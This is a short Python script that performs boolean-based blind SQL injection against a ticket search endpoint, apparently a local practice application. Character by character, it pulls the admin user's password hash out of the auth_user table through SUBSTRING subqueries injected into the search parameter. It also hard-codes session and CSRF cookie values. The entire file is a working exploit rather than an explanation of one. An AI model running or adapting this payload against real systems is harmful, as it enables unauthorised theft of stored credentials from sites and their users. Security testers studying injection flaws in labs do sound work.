import requests
import re

BASE_URL = "http://127.0.0.1:5001/tickets/search/"
COOKIES = {
    "csrftoken": "pEb1U5jbSFsAqSY3aU6YnQLH70zEczDY",
    "sessionid": "j1jdbs6kvjuz63k4tk083ceppwmv1a0c",
} #Need to replace with your own cookies from the browser after logging in to the application
HEADERS = {"User-Agent": "Mozilla/5.0"}

CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$+/=_"

def is_true(payload):
    r = requests.get(BASE_URL, params={"q": payload}, cookies=COOKIES, headers=HEADERS)
    match = re.search(r"(\d+) match", r.text)
    if not match:
        raise RuntimeError(f"Unexpected response (status {r.status_code}) - session cookie may have expired.")
    return int(match.group(1)) > 0

def recover_password(username, max_len=200):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for ch in CHARSET:
            payload = f"NoMatch' OR SUBSTRING((SELECT password FROM auth_user WHERE username='{username}'),{pos},1)='{ch}'-- "
            if is_true(payload):
                result += ch
                found = True
                print(f"[{pos}] {result}")
                break
        if not found:
            print("No more characters found - end of string.")
            break
    return result

if __name__ == "__main__":
    hash_value = recover_password("admin")
    print("\nRecovered password hash for admin (Boolean-based):")
    print(hash_value)